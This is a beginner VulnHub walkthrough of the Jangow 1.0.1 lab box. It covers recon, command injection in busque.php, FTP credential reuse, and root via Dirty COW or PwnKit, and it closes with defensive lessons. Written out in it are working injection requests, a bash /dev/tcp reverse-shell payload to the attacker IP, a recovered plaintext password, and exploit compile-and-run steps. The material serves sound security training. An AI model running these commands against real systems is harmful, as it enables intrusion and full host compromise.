# Jangow: 1.0.1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | Jangow: 1.0.1 |
| **Difficulty** | easy |
| **Author** | Jangow |
| **Released** | 4 November 2021 (v1.0.1) |
| **VulnHub Entry** | [https://vulnhub.com/entry/jangow-101,754/](https://vulnhub.com/entry/jangow-101,754/) |
| **Download** | [https://vulnhub.com/entry/jangow-101,754/#download](https://vulnhub.com/entry/jangow-101,754/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Ubuntu 16.04) |

> Educational boot2root. Everything here is done against a machine you own and
> run in an isolated lab network. The author's hint is *"The secret to this box
> is enumeration!"* — and that is exactly the game here.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to enumerate an **FTP** service (and what anonymous access looks like).
- How to discover a hidden directory tree on a web server.
- What a **command-injection / LFI** bug in a PHP page (`busque.php?buscar=`) is
  and how to exploit it for Remote Code Execution (RCE).
- How to read application config files to recover credentials, then reuse them
  against another service (FTP).
- Why outbound reverse shells are sometimes blocked, and how to work around it.
- How to fingerprint the kernel and escalate with a **local kernel exploit**.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able
to import an OVA.

---

## 1. Reconnaissance — finding the target

> **Goal:** identify the target's IP address on your isolated lab network.

```bash
# Identify your own IP + subnet first (the lab NIC is usually eth0)
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
# ARP-scan the subnet to list live hosts (fast, uses ARP not TCP)
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:xx:xx:xx   (your Kali)
192.168.56.101  08:00:27:a1:b2:c3   (Jangow — the target)
```

**Target IP:** `192.168.56.101` (yours may differ; DHCP assigns it).

![recon — finding the target](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — open ports and services


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 21,80 -oA scans/services 192.168.56.101
```


> ### 📖 Concept — FTP, and why "anonymous" is the first thing to try
>
> **FTP** (port 21) predates modern authentication. It sends usernames, passwords and
> file contents in **cleartext**, and it has a built-in convention for public access:
> the account **`anonymous`**, traditionally with an email address (or nothing) as the
> password.
>
> ```bash
> ftp target                     # then: anonymous / (blank)
> curl -s ftp://anonymous:@target/
> wget -r ftp://anonymous:@target/          # mirror the whole tree
> nmap -p21 --script ftp-anon,ftp-vuln-cve2010-4221 target
> ```
>
> Inside an FTP session: `ls`, `cd`, `binary` (**switch mode before downloading
> anything non-text** — ASCII mode corrupts binaries), `get`, `mget`, `put`, `recurse`.
>
> **Two things to check immediately.** First, is anonymous access *enabled*? Second, is
> it **writable** — does `put shell.php` succeed? A writable FTP root that overlaps
> the web document root is a web-shell upload with no exploitation required. Also look
> for `backup.zip`, `creds.txt`, `id_rsa`, `web.config` and any `notes.txt` — authors
> leave the next step in a file named something obvious.
>
> ProFTPD 1.3.3c specifically ships a **compile-time backdoor** (`telnet target 6200`
> gives root); check the exact version against Exploit-DB before assuming you need
> credentials.
>
> **Deep dive:** [CONCEPTS §9.5 — FTP](../../docs/CONCEPTS.md#95-ftp--port-21)

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

> **How to read it:** `vsftpd 3.0.3` on port 21 and a web server on port 80.
> Two attack surfaces. We begin with the web app but keep FTP in mind.

![nmap service scan output](images/02-nmap.png)

### 2.1 FTP — try anonymous first

```bash
ftp 192.168.56.101
# Name: anonymous
# Password: anonymous
```

```text
331 Please specify the password.
530 Login incorrect.
```

> **Why it matters:** on this build anonymous FTP is **disabled** (some writeups
> report it open; behaviour **varies by build**). Don't stop here — note it and
> move on, because credentials found later will work. That is the "enumeration is
> the secret" theme.

### 2.2 Web — find the application

Browse `http://192.168.56.101` and you get a **directory listing** containing a
single folder, `site/`:


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
dirb http://192.168.56.101/site/ /usr/share/dirb/wordlists/common.txt
```

```text
+ http://192.168.56.101/site/busque.php
+ http://192.168.56.101/site/index.html
+ http://192.168.56.101/site/wordpress/   (directory listing)
```

`site/` is a "Grayscale" template. The interesting part is **`busque.php`**
("buscar" = *search* in Spanish) — a dynamic page. Inspect its source:

```bash
curl 'http://192.168.56.101/site/busque.php'
```

```text
<?php system($_GET['buscar']); ?>
```

> **Why it works (the bug):** the whole script passes the `buscar` GET parameter
> straight to the shell's `system()` call. This is textbook **command injection**
> (and doubles as a way to read any file, i.e. an LFI-like primitive). No
> sanitisation at all.

![web enumeration — /site and busque.php](images/03-enum.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Remote Code Execution via `buscar`

```bash
curl 'http://192.168.56.101/site/busque.php?buscar=id'
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We have RCE as `www-data`. Chain commands with `;` to explore:

```bash
curl 'http://192.168.56.101/site/busque.php?buscar=ls -la /home'
```

```text
drwxr-xr-x 3 1000 1000 4096 ... jangow01
```

```bash
curl 'http://192.168.56.101/site/busque.php?buscar=cat /home/jangow01/user.txt'
```

```text
d41d8cd98f00b204e9800998ecf8427e
```

That value (the MD5 of an empty string) is a placeholder — the real root flag
lives in `/root` later. Now hunt for credentials in the web tree:

```bash
curl 'http://192.168.56.101/site/busque.php?buscar=cat /site/wordpress/config.php'
# or, on some builds, a hidden backup:
curl 'http://192.168.56.101/site/busque.php?buscar=cd ..;ls -all;cat .backup'
```

```text
$username = "desafio02";     # appears in some configs (varies by build)
$db_username = "jangow01";
$password    = "abygurl69";
```

> **Why it works:** application source/config files frequently contain database
> or system credentials in plaintext. We didn't exploit them yet — we just
> **enumerated** and reused a secret found in one service against another.

### 3.2 Reuse the credentials against FTP

```bash
ftp 192.168.56.101
# Name: jangow01
# Password: abygurl69
```

```text
230 Login successful.
ftp> cd /home/jangow01
ftp> ls
user.txt
ftp> get user.txt
```

> **Why it works (credential reuse):** the same account/password used by the web
> app is a valid **system/FTP login**. Weak, reused credentials are one of the
> most common real-world footholds.

![FTP login with reused credentials](images/04-foothold.png)

### 3.3 About reverse shells on this box

Because you have RCE through `busque.php`, you can already run commands. On many
builds the target **cannot dial back out** to Kali, so a classic `nc` reverse
shell silently fails (firewall / NAT). Options, in order of ease:

1. **Keep using `busque.php`** to run commands — perfectly adequate for the box.
2. **FTP-upload a script and run it** — you can `put` files via the working FTP
   account, then trigger them with `buscar=bash /home/jangow01/script.sh`.
3. **Upload a web-based proxy + bind shell** and tunnel through it (advanced;
   used when both directions are blocked). A bind shell listens on the target:


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
# On the target (via buscar), start a bind shell on a port
curl 'http://192.168.56.101/site/busque.php?buscar=bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
```

Get a proper TTY once you have any shell:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then press Ctrl+Z, run:  stty raw -echo; fg   and:  export TERM=xterm
```

![shell as www-data](images/05-shell.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — becoming root

### 4.1 Fingerprint first

```bash
curl 'http://192.168.56.101/site/busque.php?buscar=uname -a'
```

```text
Linux jangow01 4.4.0-31-generic #50-Ubuntu SMP ... x86_64 GNU/Linux
```

```text
Ubuntu 16.04.x LTS        (old — a strong hint for a kernel exploit)
```

Check the usual suspects:


> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
curl 'http://192.168.56.101/site/busque.php?buscar=id;find / -perm -4000 -type f 2>/dev/null'
```

```text
/usr/bin/pkexec
/usr/bin/sudo
...
```

### 4.2 Kernel exploit (primary path)

> **Why it works:** the kernel `4.4.0-31-generic` on Ubuntu 16.04 is vulnerable
> to well-known local privilege-escalation bugs, including **Dirty COW
> (CVE-2016-5195)** and the **BPF verifier overflow (CVE-2017-16995)**. A local
> exploit rewrites kernel memory to give the running process UID 0. This **varies
> by build** — always confirm the exact kernel version before choosing a PoC, and
> reset the VM between attempts.


> ### 📖 Concept — Kernel exploits: how to match one, and why to use them last
>
> ```bash
> uname -a; cat /proc/version; cat /etc/os-release
> searchsploit linux kernel $(uname -r | cut -d- -f1)
> ```
>
> Cross-reference the version at <https://www.linuxkernelcves.com/> and
> <https://github.com/SecWiki/linux-kernel-exploits>. Frequent favourites:
>
> | Exploit | Kernel | Mechanism |
> | --- | --- | --- |
> | **Dirty COW** (CVE-2016-5195) | < 4.8.3 | Race in copy-on-write → write any file |
> | **Overlayfs** (CVE-2015-1328) | Ubuntu 3.13–3.19 | Namespace + setuid → root |
> | **PwnKit** (CVE-2021-4034) | polkit < 0.120 | `pkexec` memory corruption |
> | **Baron Samedit** (CVE-2021-3156) | sudo < 1.9.5p2 | `sudoedit` heap overflow |
> | **Dirty Pipe** (CVE-2022-0847) | 5.8 – 5.16.11 | Page-cache write → overwrite any file |
>
> **Match the architecture too.** A 32-bit target (`i686` in `uname -a`) needs the
> 32-bit build; a mismatched exploit fails with a confusing error. Compile with the
> flags the author specifies — Dirty COW's `40847.cpp` needs
> `g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil`.
>
> > ⚠️ **Use kernel exploits last.** They can panic the VM, corrupt the filesystem
> > and cost you a full re-import. If a clean misconfiguration path exists — `sudo`,
> > SUID, capabilities, cron, a writable file — take it. Kernel exploitation is the
> > fallback when the administrator got everything else right.
>
> **Read the exploit before running it.** Many public entries are unverified and some
> are hostile to whoever runs them. `searchsploit -x <id>` and understand it.
>
> **Deep dive:** [CONCEPTS §15.7 — Kernel exploits](../../docs/CONCEPTS.md#157-kernel-exploits)
> ### 📖 Concept — CVEs, Exploit-DB and searchsploit
>
> **The identifiers:**
> - **CVE** — a stable ID for one vulnerability. `CVE-2014-6271` is Shellshock.
>   Look it up at <https://nvd.nist.gov/vuln/search>.
> - **CVSS** — a 0.0–10.0 severity score. Useful for *prioritising*, **not** for
>   deciding exploitability: a CVSS 9.8 needing physical access is less useful to you
>   than a 5.3 reachable over HTTP.
> - **EDB ID** — a numbered public proof-of-concept on Exploit-DB.
>
> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive shipped
> with Kali. Offline matters — it works mid-engagement with no internet.
>
> ```bash
> searchsploit wordpress 4.8            # search titles and paths
> searchsploit -t apache 2.4            # titles only — far fewer false positives
> searchsploit -m php/webapps/37596.py  # mirror (copy) it into your cwd
> searchsploit -x php/webapps/41006.txt # examine (print) it
> searchsploit -p 41006                 # show the full path
> searchsploit --update                 # refresh the local database
> ```
>
> > **Read the exploit before you run it.** Non-negotiable, for three reasons:
> > (1) many Exploit-DB entries are *unverified*, and some are outright malicious to
> > the person running them; (2) you need to know which parameters to change
> > (`RHOST`, `LHOST`, target path, memory offsets); (3) understanding it is the
> > entire point of the exercise.
>
> The workflow that actually works: get an exact **version** from `nmap -sV` or the
> app's own footer, search it, read the top candidate, then reproduce the request
> **by hand with `curl`** so you know what exploitation looked like. Only then decide
> whether the automated module is worth it.
>
> **Deep dive:** [CONCEPTS §11 — Finding and using exploits](../../docs/CONCEPTS.md#11-finding-and-using-exploits)

```bash
# On Kali: fetch a public PoC for the exact kernel (Exploit-DB / GitHub)
searchsploit 4.4.0-31        # lists Dirty COW and BPF LPE exploits
```

Move the exploit to the target. Because FTP works, it's the cleanest transport:

```bash
ftp 192.168.56.101
# Name: jangow01
# Password: abygurl69
ftp> cd /tmp
ftp> put dirtycow-mem            # or the BPF exploit: 45010.c
```

Then compile and run it via the RCE:

```bash
curl 'http://192.168.56.101/site/busque.php?buscar=cd /tmp;gcc -pthread dirty.c -o dirty -lcrypt;ls -la'
curl 'http://192.168.56.101/site/busque.php?buscar=cd /tmp;./dirtycow-mem'
```

```text
[*] credentials patched, launching shell...
```

If you got a shell, you're root. Verify:

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

### 4.3 Alternative: PwnKit (CVE-2021-4034)

If the build exposes a vulnerable SUID `pkexec` (as listed above), you can use
**PwnKit** instead — it is simpler and does not depend on the exact kernel:

```bash
# On Kali, get the PwnKit PoC, then transfer via FTP or base64 piping
ftp 192.168.56.101
ftp> put PwnKit /tmp/PwnKit
```

```bash
curl 'http://192.168.56.101/site/busque.php?buscar=cd /tmp;chmod +x PwnKit;./PwnKit'
```

```text
# whoami
root
```

![root shell](images/07-privesc.png)

### The root flag

```bash
curl 'http://192.168.56.101/site/busque.php?buscar=cat /root/proof.txt'
```

```text
<proof.txt contents — exact value varies by build>
```

![root flag (proof.txt)](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Command injection / arbitrary file read | `site/busque.php?buscar=` | RCE as `www-data` |
| 2 | Credentials in plaintext application config | `site/wordpress/config.php` / `.backup` | Valid system/FTP login (`jangow01`) |
| 3 | Credential reuse across services | FTP (21) | Interactive access to the host |
| 4 | Outdated kernel / SUID `pkexec` | Kernel `4.4.0-31`; `/usr/bin/pkexec` | Privilege escalation to **root** |

## 6. Defensive lessons (blue team)

- **Never pass user input to `system()`/`exec()`.** Use language features instead
  of the shell; if you must, validate against a strict allow-list. `busque.php`
  should not exist in this form at all.
- **Keep secrets out of source trees.** Use environment variables or a secrets
  manager, and never commit credentials to config files or backups in web roots.
- **Don't reuse passwords** across web apps, FTP, SSH, and system accounts, and
  disable anonymous FTP. Least privilege: the web server user should not be a
  login account.
- **Patch the OS.** Run supported kernels and apply security updates; remove or
  update SUID binaries like a vulnerable `pkexec`.
- **Detect:** alert on `www-data` spawning `sh`/`bash`/`gcc`, on outbound
  connections from web users, on FTP logins from a web-app credential, and on
  unexpected SUID execution.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: [https://vulnhub.com/entry/jangow-101,754/](https://vulnhub.com/entry/jangow-101,754/)
- Community writeups consulted:
  - [n3il.com — Jangow 1.0.1 Walkthru](https://n3il.com/vulnhub-jangow/)
  - [Infosec Institute — Jangow 1.0.1 CTF walkthrough](https://www.infosecinstitute.com/resources/capture-the-flag/jangow-1-0-1-ctf-walkthrough/)
  - [Testing On Prod — Jangow 1.0.1 Writeup](https://testingonprod.com/2021/12/05/vulnhub-jangow-1-0-1-writeup/)
- Background reading:
  - [CVE-2016-5195 — Dirty COW](https://nvd.nist.gov/vuln/detail/CVE-2016-5195)
  - [CVE-2017-16995 — BPF verifier LPE](https://nvd.nist.gov/vuln/detail/CVE-2017-16995)
  - [CVE-2021-4034 — PwnKit](https://nvd.nist.gov/vuln/detail/CVE-2021-4034)
  - [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target (arp-scan)
- [ ] `images/02-nmap.png` — port/service scan (21 ftp, 80 http)
- [ ] `images/03-enum.png` — `/site/busque.php` and directory discovery
- [ ] `images/04-foothold.png` — command injection → RCE, FTP credential reuse
- [ ] `images/05-shell.png` — shell / command execution as `www-data`
- [ ] `images/06-user-flag.png` — `user.txt` contents
- [ ] `images/07-privesc.png` — kernel/PwnKit exploit → `root`
- [ ] `images/08-root-flag.png` — root flag (`proof.txt`)

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
